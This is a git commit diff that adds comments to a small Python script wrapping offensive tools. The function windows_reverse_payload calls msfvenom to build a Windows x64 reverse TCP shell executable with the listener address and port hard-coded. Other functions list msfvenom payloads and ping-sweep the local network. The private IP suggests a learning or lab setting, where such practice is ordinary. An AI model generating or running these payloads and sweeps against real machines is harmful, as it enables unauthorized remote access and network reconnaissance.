aa7aef1abf84f5930e88d8ff877467c4ac5a5d9e
Jaime Serranzana <jcs909@gmail.com>
2021-12-20 20:58:49 -0500

    documented code

--- new_code.py
+++ new_code.py
@@ -3,29 +3,31 @@
 
 ### IMPORT STATEMENTS ###
 import sys  # import the sys library
-import subprocess
-import socket
+import subprocess # import the subprocess library
+import socket # import the socket library
 
 
 ### HELPER FUNCTIONS ###
-def get_local():  # define our line printing function
+def get_local():  # calls ifconfig
     return_code = subprocess.call(['ifconfig'])
     print("output:", return_code)
 
-def open_payloads():
+def list_payloads(): # lists all the msfvenom payloads
     return_code = subprocess.call(['msfvenom','-l','payloads'])
     print("output:", return_code)
 
-def windows_reverse_payload():
+def windows_reverse_payload(): # creates a payload for a windows machine with all the options hard coded
     return_code = subprocess.call(['msfvenom','-p','windows/x64/shell_reverse_tcp','LHOST=10.0.2.15','LPORT=1337','-f','exe','-o','shell_test.exe'])
     print("output:", return_code)
 
-def get_ip():
+def get_ip(): # gets ip address of local computer
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect(("8.8.8.8", 80))
-    print(s.getsockname()[0])
+    ip_address = s.getsockname()[0]
+    return ip_address
+    #print(s.getsockname()[0])
 
-def ping_sweep():
+def ping_sweep(): # does a sweep of the local network using 
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect(("8.8.8.8", 80))
     local_address = s.getsockname()[0]
@@ -40,19 +42,7 @@ def ping_sweep():
 def main():  # define a main function
     pinging = ping_sweep()
     print(pinging)
-
-    # windows_reverse_payload()
-    # get_ip()
-    # open_payloads()
-    # get_local()
-
-    # file_to_open = sys.argv[1]  # get the file name from the cmd line
-
-    # opened_file = open(file_to_open)  # open the file
-
-    # is_even(opened_file)  # call our print words function with the open file
-
-    # opened_file.close()  # close the file when done
+    print(get_ip())
 
 
 ### DUNDER CHECK ###
